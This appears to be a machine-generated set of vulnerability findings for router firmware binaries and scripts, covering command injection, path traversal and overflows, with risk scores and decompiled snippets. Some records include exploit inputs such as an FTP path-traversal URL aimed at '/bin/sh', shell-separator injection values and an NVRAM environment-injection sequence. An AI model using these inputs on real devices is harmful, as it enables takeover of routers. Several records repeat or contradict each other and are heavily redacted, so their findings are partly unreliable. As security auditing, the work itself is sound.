{"name": "PATH-TRAVERSAL-WGET-HTTP-LOOP", "file_path": "bin/wget", "location": "wget:0x1cfa4 (file_exists_p)", "risk_score": 8.5, "confidence": 9.0, "description": "Path Traversal Vulnerability in HTTP: The `url_parse` and `url_file_name` functions fail to filter `../` sequences (e.g., `'http://attacker/../../../etc/config'`), allowing tainted paths to propagate to `http_loop`. The `file_exists_p` function directly passes the tainted path to `stat64` without path normalization. Missing boundary checks: `http_loop` uses a 256-byte stack buffer (`auStack_200`) but fails to validate path length. Security Impact: 1) Arbitrary file read/write (dependent on target file permissions) 2) Stack overflow via excessively long paths. Exploitation: Craft malicious URLs to trigger file operations or buffer overflows.", "code_snippet": "file_exists_p: uint32_t sym.file_exists_p(uint param_1){ return ~stat64(param_1)>>0x1f; }", "link_identifiers": ["url_parse", "file_exists_p", "stat64", "auStack_200", "../../../etc/config"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "ARBITRARY-FILE-WRITE-WGET-FTP", "file_path": "bin/wget", "location": "wget: getftp function", "risk_score": 9.5, "confidence": 8.75, "description": "FTP Arbitrary File Write Vulnerability: The retrieve_url function passes an unvalidated URL to ftp_loop, and the getftp function directly passes the arg_89h parameter to fopen64. The --restrict-file-names option is disabled by default, failing to filter path traversal sequences (../). Boundary checks are absent: no path normalization or permission verification. Security Impact: Overwriting system files (e.g., /bin/sh) leads to code execution. Exploitation Method: 'wget ftp://attacker/../../bin/sh', with success probability depending on: 1) wget process privileges (typically REDACTED_PASSWORD_PLACEHOLDER) 2) target filesystem permissions.", "code_snippet": "iVar18 = sym.imp.fopen64(*(iVar13 + 0x20), uVar10);", "link_identifiers": ["getftp", "fopen64", "retrieve_url", "ftp_loop", "arg_89h", "--restrict-file-names", "*(iVar13 + 0x20)"], "notes": "Prerequisite conditions: 1) Attacker controls the FTP server 2) The target path is writable. It is recommended to verify /bin/sh permissions."}
{"name": "Buffer-Overflow-tcpdump-pcap_activate_linux-0x72a30", "file_path": "usr/sbin/tcpdump", "location": "tcpdump:0x72a30 (pcap_activate_linux)", "risk_score": 8.5, "confidence": 7.75, "description": "An unvalidated strcpy call was identified in the pcap_activate_linux function (0x72a30). Specific trigger condition: when tcpdump processes user-supplied network interface names (e.g., command-line arguments or configuration injection), it fails to validate input length. The target buffer resides on the stack (var_48h), with source data passed via the r1 register. Attackers can craft an oversized interface name (>72 bytes) to overwrite stack data, achieving arbitrary code execution. Exploitation path: attackers inject malicious interface names through device configuration interfaces (e.g., Web UI/CLI) → triggers tcpdump execution → triggers stack overflow.", "code_snippet": "0x00072a30 bl sym.imp.strcpy\n0x00072a34 ldr r0, [r4]\n0x00072a38 movw r1, 0x89b0", "link_identifiers": ["pcap_activate_linux", "strcpy", "var_48h", "r1", "ioctl", "nvram", "lan_ifname"], "notes": "Special verification required: 1) Exact buffer size of var_48h 2) Whether the interface name can be configured via NVRAM (e.g., nvram set lan_ifname)"}
{"name": "Format-String-tcpdump-rodata-0x000ad0a5", "file_path": "usr/sbin/tcpdump", "location": "tcpdump: .rodata section", "risk_score": 0.2, "confidence": 4.75, "description": "Detected suspicious format string (containing %n write operator), but located in the .rodata section with no code references (axt command yields no output). Trigger condition: No network packet processing path or command-line parsing path utilizes these format strings, %n operator cannot be triggered by external input. Security impact: Theoretical vulnerability with no practical exploitation path.", "link_identifiers": ["0x000ad0a5", "0x000ad12e", "0x000ad184", ".rodata", "axt"]}
{"name": "Function-Implementation-safememcpy-0x59ac8", "file_path": "usr/sbin/tcpdump", "location": "tcpdump:0x59ac8 (safememcpy)", "risk_score": 0.5, "confidence": 4.65, "description": "The safememcpy function is merely a wrapper for memcpy (0x59ac8) and does not implement length validation. However, all 28 of its call sites are located within IKE protocol parsing functions (such as isakmp_print), where strict length validation is performed before invocation (e.g., checking *(param_1+0xb4)). No buffer overflow risks due to improper parameter passing have been identified.", "link_identifiers": ["safememcpy", "isakmp_print", "ikev1_sub_print", "param_1+0xb4"]}
{"name": "Vuln-httpd-USB-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "usr/sbin/httpd", "location": "httpd:0x88c60", "risk_score": 9.5, "confidence": 8.75, "description": "USB file upload command injection vulnerability. Trigger condition: attacker controls specific fields (file name/content) of uploaded files to inject command separators. Constraint: requires access to unauthenticated file upload interface. Security impact: contaminates param_1+0x4c through sscanf parsing and concatenates into popen command, leading to direct RCE. Exploitation method: construct upload content containing `;malicious command`.", "code_snippet": "sym.imp.sprintf(puVar10 -0x84,*0x88df0,uVar6,*(param_1+0x4c));\npopen(puVar10-0x84);", "link_identifiers": ["fcn.00088aa4", "param_1+0x4c", "popen", "sscanf", "0x88c60", "usb_upload"], "notes": "The specific upload interface URL needs to be supplemented (current evidence is insufficient)"}
{"name": "Vuln-httpd-NVRAM-UnauthWrite", "file_path": "usr/sbin/httpd", "location": "httpd:0x2b8d8", "risk_score": 8.1, "confidence": 9.25, "description": "Unauthorized NVRAM write vulnerability. Trigger condition: Sending an HTTP request containing target parameters (e.g., ddns_REDACTED_PASSWORD_PLACEHOLDER). Constraint: Some interfaces require authentication but have bypass paths for Authorization headers. Security impact: Lack of length validation in nvram_set calls leads to configuration tampering, potentially causing service disruption or follow-up attacks. Exploitation method: Submitting excessively long/malicious parameters to pollute NVRAM.", "code_snippet": "ldr r0, str.ddns_REDACTED_PASSWORD_PLACEHOLDER\nadd r1, r1, 0x14\nbl sym.imp.nvram_set", "link_identifiers": ["fcn.0002b8d8", "nvram_set", "ddns_REDACTED_PASSWORD_PLACEHOLDER", "arg_1000h+0x14", "NVRAM_write"], "notes": "privilege_escalation"}
{"name": "Vuln-httpd-CGI-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "usr/sbin/httpd", "location": "httpd:0x3889c", "risk_score": 8.7, "confidence": 8.5, "description": "CGI command injection vulnerability. Trigger condition: Access /cgi-bin/apply_sec.cgi and contaminate parameters. Constraint: param_4 must be a valid HTTP method (0=GET/1=POST). Security impact: Unfiltered parameters are concatenated into `service restart %s` and executed via system(), leading to RCE. Exploitation method: Craft URL parameters with `service restart;malicious_command`.", "code_snippet": "snprintf(cmd, 0x100, \"service restart %s\", src);\nsystem(cmd);", "link_identifiers": ["fcn.000384a0", "system", "/cgi-bin/apply_sec.cgi", "param_4", "snprintf", "cgi_injection"], "notes": "Command behavior requires environment validation"}
{"name": "AttackChain-httpd-USB-RCE", "file_path": "usr/sbin/httpd", "location": "httpd:0x88c60", "risk_score": 9.2, "confidence": 4.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["usb_upload", "popen", "RCE_chain", "fcn.00088aa4"], "notes": "attack_chain\nPrerequisite: The upload interface URL must be clearly identified; success probability 85%"}
{"name": "AttackChain-httpd-NVRAM-PrivEsc", "file_path": "usr/sbin/httpd", "location": "httpd:0x2b8d8", "risk_score": 7.8, "confidence": 3.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["NVRAM_write", "nvram_set", "privilege_escalation", "ddns_REDACTED_PASSWORD_PLACEHOLDER"], "notes": "attack_chain  \nPrerequisite: Service execution of NVRAM value required; Exploitation probability 70%"}
{"name": "AttackChain-NVRAM-Pollution", "file_path": "usr/sbin/httpd", "location": "httpd:0x2b8d8 → bin/eapd:0x9c50 | bin/wps_monitor:0xd548", "risk_score": 9.5, "confidence": 8.65, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// httpdHIDDEN\nbl sym.imp.nvram_set\n// eapdHIDDEN\nsym.imp.strncpy(iVar1,param_2,0xf);\n// wps_monitorHIDDEN\nsym.imp.sprintf(buffer,*0xe504);", "link_identifiers": ["nvram_set", "fwd_wlandevs", "0xe504", "get_ifname_by_wlmac", "sprintf", "NVRAM_write", "ddns_REDACTED_PASSWORD_PLACEHOLDER"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "Vuln-eapd-HeapOverflow", "file_path": "usr/sbin/httpd", "location": "bin/eapd:0x9c50", "risk_score": 9.2, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "iVar1 = get_ifname_by_wlmac(param_1);\nsym.imp.strncpy(iVar1,param_2,0xf); // HIDDEN", "link_identifiers": ["fcn.00009e48", "get_ifname_by_wlmac", "strncpy", "fwd_wlandevs", "nvram_get"], "notes": "Source of contamination: The ddns_REDACTED_PASSWORD_PLACEHOLDER parameter in httpd is written to NVRAM."}
{"name": "Vuln-wps_monitor-FormatString", "file_path": "usr/sbin/httpd", "location": "bin/wps_monitor:0xd548", "risk_score": 8.8, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sym.imp.sprintf(buffer, *0xe504, ...); // HIDDEN", "link_identifiers": ["fcn.0000d548", "sprintf", "0xe504", "buffer_overflow"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "Command Injection-run_remote-NVRAM-RCE", "file_path": "opt/remote/run_remote", "location": "run_remote:0xb240 fcn.0000af1c", "risk_score": 9.5, "confidence": 8.9, "description": "The run_remote program contains a high-risk command injection vulnerability. Specific manifestation: The program retrieves the value of the NVRAM configuration item 'remote_path' via nvram_get_value, without performing path validity verification or command filtering (no blacklist/whitelist checks), and directly constructs it as an execl parameter for execution. Trigger conditions: 1) An attacker can tamper with the NVRAM's remote_path value (e.g., via an unauthorized Web API); 2) The target device executes remote management functions. Security impact: Attackers can inject arbitrary commands (such as '/bin/sh -c' or paths to malicious scripts) to achieve remote code execution (RCE). Exploitation method: Set remote_path to command separators like ';/bin/sh;' or point it to a malicious binary controlled by the attacker.", "code_snippet": "uVar3 = sym.imp.std::string::c_str___const(puVar6 + iVar1 + -0x3c);\nsym.imp.execl(uVar3,0,0);", "link_identifiers": ["fcn.0000af1c", "auStack_3c", "nvram_get_value_std::string_const__std::string_", "remote_path", "std::string::c_str", "execl"], "notes": "Verify the security of the NVRAM modification interface (suggest analyzing the /etc/www directory in subsequent steps). Attack chain completeness assessment: contamination source (NVRAM) → propagation path (no filtering) → dangerous operation (execl), CVSS v3.1 vector: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}
{"name": "Command Injection-run_remote-NVRAM-RCE", "file_path": "opt/remote/run_remote", "location": "run_remote:0xb240 fcn.0000af1c", "risk_score": 9.5, "confidence": 8.9, "description": "The run_remote program contains a high-risk command injection vulnerability. Specific manifestation: The program retrieves the value of the NVRAM configuration item 'remote_path' via nvram_get_value, without performing path validity verification or command filtering (no blacklist/whitelist checks), and directly constructs it as an execl parameter for execution. Trigger conditions: 1) An attacker can tamper with the NVRAM remote_path value (e.g., via an unauthorized Web API) 2) When the target device executes remote management functions. Security impact: Attackers can inject arbitrary commands (such as '/bin/sh -c' or paths to malicious scripts) to achieve remote code execution (RCE). Exploitation method: Set remote_path to command separators like ';/bin/sh;', or point it to a malicious binary controlled by the attacker.", "code_snippet": "uVar3 = sym.imp.std::string::c_str___const(puVar6 + iVar1 + -0x3c);\nsym.imp.execl(uVar3,0,0);", "link_identifiers": ["fcn.0000af1c", "auStack_3c", "nvram_get_value_std::string_const__std::string_", "remote_path", "std::string::c_str", "execl"], "notes": "Command Injection"}
{"name": "AttackChain-Integration-run_remote-NVRAM-CmdInjection", "file_path": "opt/remote/run_remote", "location": "HIDDEN: SSRFHIDDEN → RMT_invite.cgi → run_remote", "risk_score": 9.5, "confidence": 4.4, "description": "New command injection vulnerability integrated into the attack chain: 1) Endpoint compromise: run_remote program achieves RCE by executing tainted 'remote_path' value via execl 2) Attack chain dependency: Requires executing 'nvram set remote_path=malicious_value' through exposed interfaces (e.g. RMT_invite.cgi) 3) Initial entry: Existing SSRF vulnerability (SSRF-GenieCGI-t-param) can access internal interfaces. Full trigger conditions: a) Unauthorized nvram set operation exists in RMT_invite.cgi b) Tainted value can propagate to run_remote execution point. Exploit probability: Currently 0.0 (no evidence of write interface) →9.2 (if write interface exists)", "link_identifiers": ["Command Injection-run_remote-NVRAM-RCE", "remote_path", "nvram set", "RMT_invite.cgi", "execl", "SSRF-GenieCGI-t-param"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "Network-Input-Propagation-upnpd-recv", "file_path": "usr/sbin/upnpd", "location": "usr/sbin/upnpd:0xcea4 (fcn.0000ccc0); usr/sbin/upnpd:0x1c0c4 (fcn.0001bf48); usr/sbin/upnpd:0x1c5d8 (fcn.0001c1d0)", "risk_score": 0.0, "confidence": 4.75, "description": "The network input propagation is solely utilized within the functions fcn.0000ccc0/fcn.0001bf48/fcn.0001c1d0 for string parsing (strsep/strncasecmp) and response construction. The propagation process involves strstr/stristr checks but lacks boundary protection. Trigger condition: Receiving UDP/TCP packets. Security impact: No flow to hazardous functions such as system/nvram_set, posing no risks of memory corruption or command injection.", "link_identifiers": ["recv", "fcn.0000ccc0", "fcn.0001bf48", "fcn.0001c1d0", "strsep", "strncasecmp", "strstr", "stristr"]}
{"name": "Static-Command-Execution-upnpd-popen", "file_path": "usr/sbin/upnpd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.2, "confidence": 4.8, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// HIDDEN\nsprintf(buffer, \"%s%s\", fixed_str, global_array[0x4d]);\nsystem(buffer);", "link_identifiers": ["popen", "system", "0x25000", "0x3871c", "0x3a614", "0x58a78", "0x584a0", "REDACTED_SENSITIVE_DATA"]}
{"name": "Analysis-Limitation-upnpd-nvram", "file_path": "usr/sbin/upnpd", "location": "usr/sbin/upnpd:0x4087c0 (HIDDEN)", "risk_score": 0.0, "confidence": 5.0, "description": "Analysis Limitation: nvram_set analysis failed - Target address 0x4087c0 exceeds binary loading range (0x8000-0x407fff), unable to verify parameter contamination path. Security impact unknown. Further verification required to locate valid NVRAM function address.", "link_identifiers": ["0x4087c0", "nvram_set"], "notes": "Follow-up recommendations: 1) Relocate nvram_set through symbol table 2) Verify whether the global arrays 0x58a78/0x584a0 are modified by other components"}
{"name": "heap-overflow-tcp-parser-0x16f80", "file_path": "opt/remote/remote", "location": "remote:0x16f80", "risk_score": 9.8, "confidence": 9.25, "description": "Heap Overflow Vulnerability:\n1. Attack Vector: Network input (recv) → Colon-delimited parsing → Unverified strcpy\n2. Trigger Condition: Attacker sends TCP packet with specific colon positioning\n3. Vulnerability Mechanism: strcpy in fcn.00016a1c copies substring to heap buffer without length validation, allowing maximum overflow of 256 bytes\n4. Security Impact: Remote Code Execution (CVSS 9.8), 90% success rate (no authentication + plaintext protocol)", "code_snippet": "strcpy(*(puVar8 + -0x40), *(puVar8 + -0x30) + *(puVar8 + -0x34) + 2)", "link_identifiers": ["strcpy@0x16f80", "fcn.00016a1c", "recv", "*(puVar8 + -0x40)", "*(puVar8 + -0x30)"], "notes": "Verification required: 1) Whether the buffer contains function pointers 2) Heap layout controllability | Conclusion: Priority should be given to fixing the heap overflow vulnerability (strcpy@0x16f80)"}
{"name": "stack-overflow-dynamic-length-0x186d8", "file_path": "opt/remote/remote", "location": "fcn.000182f4:0x186d8", "risk_score": 8.7, "confidence": 8.5, "description": "Critical Stack Overflow Vulnerability:  \n1. Attack Vector: Network input (recv) → Dynamic length calculation → Fixed stack buffer write  \n2. Trigger Condition: Controlling the initial 1-byte length identifier in recv  \n3. Vulnerability Mechanism: Direct write to fixed stack buffer after dynamic length calculation (var_11ch+2) in fcn.000182f4  \n4. Security Impact: Return address overwrite enabling arbitrary code execution, risk level 8.7", "code_snippet": "ldrb r3, [r3]\nadd r3, r3, 2\nbl fcn.00017c28", "link_identifiers": ["fcn.000182f4", "var_11ch", "recv@0x186d8", "0x186b4", "0x186c8"]}
{"name": "integer-overflow-malloc-fcn.00015cdc", "file_path": "opt/remote/remote", "location": "fcn.00015cdc", "risk_score": 3.0, "confidence": 4.55, "description": "Theoretical integer overflow vulnerability:\n1. Location: Buffer expansion logic in fcn.00015cdc\n2. Trigger condition: Continuous input of ≥2GB data (without line breaks)\n3. Practical constraint: Target device physical memory ≤512MB, malloc(2GB) will inevitably fail\n4. Security impact: Only potential denial of service, actual RCE not feasible", "link_identifiers": ["fcn.00015cdc", "piVar3[-5]", "*piVar3", "sym.imp.malloc"], "notes": "Limitations: Actual device memory size not verified (relies on static analysis of firmware)"}
{"name": "RCE-HTTP-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "usr/sbin/httpd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.5, "confidence": 9.15, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sym.imp.system(*0x15338); // *0x15338 = \"rm -f /tmp/upgrade; /bin/sh\"", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "system", "0x00015a68", "stristr", "Authorization:", "POST", "multipart/form-data;", "/bin/sh", "rm -f /tmp/upgrade", "sym.imp.system"], "notes": "Associated functions: fcn.0000e6fc (request parsing), main (HTTP entry point). Actual HTTP request format requires verification. Firmware running as REDACTED_PASSWORD_PLACEHOLDER amplifies vulnerability impact. Full attack path: HTTP input → request parsing → command execution."}
{"name": "Func-httpd-RequestParser-fcn.0000e6fc", "file_path": "usr/sbin/httpd", "location": "usr/sbin/httpd:fcn.0000e6fc", "risk_score": 7.5, "confidence": 3.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["fcn.0000e6fc", "request_parser", "Authorization:", "HTTP_header", "RCE-HTTP-REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "Function to be verified"}
{"name": "Func-httpd-RequestParser-fcn.0000e6fc", "file_path": "usr/sbin/httpd", "location": "usr/sbin/httpd:fcn.0000e6fc", "risk_score": 8.8, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "HIDDENRCEHIDDEN：\nsym.imp.system(*0x15338); // *0x15338 = \"rm -f /tmp/upgrade; /bin/sh\"", "link_identifiers": ["fcn.0000e6fc", "request_parser", "Authorization:", "HTTP_header", "RCE-HTTP-REDACTED_SECRET_KEY_PLACEHOLDER", "sym.imp.system", "multipart/form-data;"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "SSRF-to-BufferOverflow-genie.cgi", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "snprintf(uVar2,uVar3,\"%s?t=%s&d=%s&c=%s\",...);\nstrncpy(*(puVar5 + -0x24),*(puVar5 + -0x40),*(puVar5 + -0x44) - *(puVar5 + -0x40));", "link_identifiers": ["t=", "X-Error-Code", "strncpy", "REDACTED_SENSITIVE_DATA", "fcn.000093e4", "snprintf"], "notes": "Remote code execution vulnerability chain.  \n\nImportant: Verification required: 1) ARM architecture stack layout and precise overflow length 2) Whether the /usr/sbin/leafp2p component is associated with the SSRF vulnerability via nvram_set."}
{"name": "Risk-httpd-BufferOverflow-Authorization", "file_path": "usr/sbin/httpd", "location": "usr/sbin/httpd:fcn.0000e6fc", "risk_score": 8.0, "confidence": 2.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["fcn.0000e6fc", "Authorization:", "buffer_overflow", "strcpy", "memcpy", "RCE-HTTP-REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "Potential memory safety risks to be verified. Prioritize analysis of the following code characteristics: 1) Buffer declaration within fcn.0000e6fc 2) Termination conditions of header parsing loop 3) Dangerous function call chains. Related record: Func-httpd-RequestParser-fcn.0000e6fc"}
{"name": "SymlinkRace-WPS_TempFiles", "file_path": "bin/wps_monitor", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.5, "confidence": 7.25, "description": "Verification confirmed that the file '/tmp/wps_pin_failed_cnt' is indeed opened in the code via fopen with read-only mode ('r'), without using the O_EXCL flag. For '/tmp/wps_monitor.pid', although the string exists in the binary file, no direct fopen call using it was found. The discovered temporary file operations pose potential symlink attack risks because: 1) The file paths are under the /tmp directory; 2) The O_EXCL flag is not used; 3) Path security is not validated.", "code_snippet": "iVar1 = sym.imp.fopen(*0x11208,*0x1120c); // *0x11208='/tmp/wps_pin_failed_cnt', *0x1120c='r'", "link_identifiers": ["/tmp/wps_pin_failed_cnt", "REDACTED_SENSITIVE_DATA", "fopen", "0x11134", "0x0002e910", "0x0002df70"], "notes": "The actual risk depends on: 1) the program's runtime permissions; 2) whether the attacker can precisely control the timing of race conditions. It is recommended to further verify the program's runtime UID and the actual sequence of file operations."}
{"name": "SSRF-to-BufferOverflow-genie.cgi", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 7.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "strncpy(*(puVar5 + -0x24),*(puVar5 + -0x40),*(puVar5 + -0x44) - *(puVar5 + -0x40));", "link_identifiers": ["t=", "X-Error-Code", "strncpy", "REDACTED_SENSITIVE_DATA"], "notes": "Further verification is required to determine the exact size of the target buffer and the stack layout to confirm the precise impact of the overflow. Based on current evidence, the probability of this finding constituting a genuine vulnerability is 7.5/10."}
{"name": "BufferOverflow-HTTP-RCE-01", "file_path": "usr/sbin/upnpd", "location": "fcn.0001bd54:0x1bd54, fcn.0001d228:0x1d228", "risk_score": 9.5, "confidence": 8.5, "description": "Remote Code Execution Attack Chain (HTTP-RCE-01):  \n- Trigger Path: Attacker sends an HTTP request with a specific SOAPAction header (e.g., SetFirmware) → `uuid` parameter passed to function fcn.0001bd54 → Copied into a 508-byte stack buffer (auStack_42c) without length check via strncpy → Secondary overflow occurs in sprintf call at fcn.0001d228 → Overwrites return address to achieve arbitrary command execution.  \n- Constraints:  \n  1. HTTP request must include a SOAPAction header.  \n  2. uuid parameter length must exceed 508 bytes.  \n  3. Requires bypassing stack protection mechanisms (e.g., ASLR/NX).  \n- Security Impact: Gains REDACTED_PASSWORD_PLACEHOLDER privileges via ROP chain.", "code_snippet": "strncpy(auStack_42c, uuid_param, 0x3ff); // First-stage overflow\nsprintf(dest, \"SERVER: %s/%s UPnP/1.0 NETGEAR-UPNP/1.0\\r\\n\", str1, str2); // Second-stage overflow", "link_identifiers": ["fcn.0001bd54", "auStack_42c", "strncpy", "fcn.0001d228", "sprintf", "uuid", "SetFirmware", "SERVER: %s/%s UPnP/1.0 NETGEAR-UPNP/1.0\\r\\n"], "notes": "The vulnerability pattern resembles known UPnP vulnerabilities (e.g., CVE-2016-1555). Actual exploitability depends on runtime protections (ASLR/NX) in the target environment."}
{"name": "PathTraversal-FILE-READ-01", "file_path": "usr/sbin/upnpd", "location": "usr/sbin/upnpd:0 [fcn.0001b954] 0x1b954", "risk_score": 8.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sprintf(puVar10, \"%s%s\", \"/Public/\", param_1);\nif (strncmp(puVar10, \"/Public\", 7) == 0) { fopen(puVar10, \"r\"); }", "link_identifiers": ["fcn.0001b954", "param_1", "strncmp", "sprintf", "puVar10", "0x1bd24", "/Public", "../"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "PathTraversal-FILE-READ-01", "file_path": "usr/sbin/upnpd", "location": "usr/sbin/upnpd:fcn.0001b954", "risk_score": 8.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sprintf(puVar10, \"%s%s\", \"/Public/\", param_1);\nif (strncmp(puVar10, \"/Public\", 7) == 0) { fopen(puVar10, \"r\"); }", "link_identifiers": ["fcn.0001b954", "param_1", "strncmp", "sprintf", "puVar10", "0x1bd24", "/Public", "../"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "ExploitChain-cp_installer-env-injection-to-leafp2p-rce-verified", "file_path": "etc/init.d/leafp2p.sh", "location": "usr/sbin/cp_installer.sh:54-56 → etc/init.d/leafp2p.sh:8-12", "risk_score": 9.8, "confidence": 8.75, "description": "Verified Attack Chain: Cross-file validation reveals an exploitation path where the environment injection point (cp_installer.sh) and RCE execution point (leafp2p.sh) are linked via NVRAM configuration. New technical detail: Malicious eco.env must include PATH export statements to ensure nvram command availability. Risk impact: Arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges, estimated CVSS score 9.8.", "code_snippet": "// HIDDEN:\n// HIDDEN1: HIDDEN\necho 'export PATH=$PATH:/usr/sbin' > /tmp/eco.env\necho 'nvram set leafp2p_sys_prefix=/tmp' >> /tmp/eco.env\n\n// HIDDEN2: HIDDEN\ncp_installer.sh ... /tmp ...\n\n// HIDDEN3: HIDDEN（HIDDEN）\n/etc/init.d/leafp2p.sh restart", "link_identifiers": ["PATH_ECO_ENV=${3}", ". ${PATH_ECO_ENV}/eco.env", "leafp2p_sys_prefix", "SYS_PREFIX", "checkleafnets.sh"], "notes": "Verified Attack Chain  \n\nAssociated Original Attack Chain ID: ExploitChain-cp_installer-env-injection-to-leafp2p-rce | Residual Risk: Service Restart Requires Additional Attack Surface"}
{"name": "CMD-INJECTION-UPGRADE_SH-PARAM", "file_path": "usr/sbin/upgrade.sh", "location": "usr/sbin/upgrade.sh:153-161", "risk_score": 8.0, "confidence": 8.0, "description": "Unvalidated command-line argument injection risk: The script directly controls sensitive operations (system stop/update) through the '$1' parameter without whitelist validation. Trigger condition: An attacker invokes this script through web interface or IPC mechanism and controls the first argument. Actual impact: May cause critical service termination (e.g., DPI service shutdown) or forcibly trigger firmware update process.", "code_snippet": "[ \"$1\" = \"all\" ] && all && exit 0\n[ \"$1\" = \"start\" ] && start_sys && exit 0\n[ \"$1\" = \"stop\" ] && stop_sys && exit 0", "link_identifiers": ["$1", "all", "update", "restore", "stop_sys", "start_sys"], "notes": "Command-line argument injection. Need to analyze parameter injection points in conjunction with HTTP interfaces/cron, attack path feasibility depends on external call context."}
{"name": "StackOverflow-HTTP_NVRAM_LANDEVS_ProcNetDev", "file_path": "bin/wps_monitor", "location": "wps_monitor:0xaf78 (fcn.0000ab80)", "risk_score": 9.0, "confidence": 8.75, "description": "Verification confirms the existence of a genuine stack overflow vulnerability in function fcn.0000ab80 (0xaf78) of the wps_monitor file. Attackers can exploit an unverified strcpy operation to overwrite the return address by controlling the 'landevs' NVRAM parameter and manipulating the contents of the /proc/net/dev file, thereby achieving arbitrary code execution.", "code_snippet": "uVar25 = sym.imp.nvram_get(*0xb2d0);\nsym.imp.strcpy(puVar24 + -0x20, puVar24 + -0x94);", "link_identifiers": ["fcn.0000ab80", "strcpy", "ebp-0x20", "ebp-0x94", "landevs", "/proc/net/dev"], "notes": "The vulnerability requires three conditions to be met: 1) control over the 'landevs' NVRAM parameter, 2) the ability to manipulate the contents of /proc/net/dev, and 3) the construction of specific overflow data. In real-world environments, these conditions may be difficult to satisfy simultaneously, but once met, the exploitability of the vulnerability is high."}
{"name": "Buffer-Overflow-tcpdump-pcap_activate_linux-0x72a30-verified", "file_path": "usr/sbin/tcpdump", "location": "tcpdump:0x72a30 (pcap_activate_linux)", "risk_score": 5.0, "confidence": 5.5, "description": "Verification found partial accuracy with discrepancies:\n1. An unverified strcpy call (0x72a30) does exist, but the target buffer is var_38h (12 bytes) rather than the reported var_48h\n2. The buffer size (12 bytes) is smaller than typical network interface name lengths (usually 16+ bytes), creating overflow potential\n3. Cannot confirm whether source data ([r4,0xd0]) is fully user-controllable\n\nActual exploit likelihood is lower than originally reported because:\n- Buffer location and size don't match the report\n- No clear evidence of taint path from user input to [r4,0xd0] exists", "code_snippet": "0x00072a28      d01094e5       ldr r1, [r4, 0xd0]\n0x00072a2c      0600a0e1       mov r0, r6\n0x00072a30      cf5efeeb       bl sym.imp.strcpy", "link_identifiers": ["pcap_activate_linux", "strcpy", "var_38h", "r1", "ioctl"], "notes": "Further verification is required to determine whether the data source of [r4,0xd0] includes user-controllable network interface names."}
{"name": "ExploitChain-leafp2p-script-execution-verified", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:8-12", "risk_score": 8.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\nstart() {\n    ${CHECK_LEAFNETS} &", "link_identifiers": ["SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)", "CHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh", "${CHECK_LEAFNETS} &"], "notes": "The fourth and fifth steps of the attack chain are verified in the 'leafp2p.sh' file. Further verification is required for the environmental injection points in the 'cp_installer.sh' file and the support status of the 'eco.env' file."}
{"name": "PathTraversal-FILE-READ-01", "file_path": "usr/sbin/upnpd", "location": "usr/sbin/upnpd:0 [fcn.0001b954] 0x1b954", "risk_score": 8.5, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sprintf(puVar10, \"%s%s\", \"/Public/\", param_1);\nif (strncmp(puVar10, \"/Public\", 7) == 0) { fopen(puVar10, \"r\"); }", "link_identifiers": ["fcn.0001b954", "param_1", "strncmp", "sprintf", "puVar10", "0x1bd24", "/Public", "../"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command-injection-wget-e-parameter-verification", "file_path": "bin/wget", "location": "bin/wget", "risk_score": 3.0, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["run_command", "parse_line", "setval_internal", "-e", "function pointer call"], "notes": "Dynamic analysis is required to fully eliminate risks, particularly concerning the function pointer invocation behavior of setval_internal. The initial vulnerability report lacks sufficient evidence, with a probability assessment of being a genuine vulnerability rated at 3.0/10.0."}
{"name": "command-injection-wget-e-parameter-verification-update", "file_path": "bin/wget", "location": "bin/wget", "risk_score": 4.5, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["parse_line", "run_command", "setval_internal", "-e"], "notes": "command-injection-verification\n\nRecommendations: 1) Obtain a more comprehensive call chain analysis 2) Inspect the implementation of specific command-handling functions 3) Test the behavior of the -e parameter in a real-world environment"}
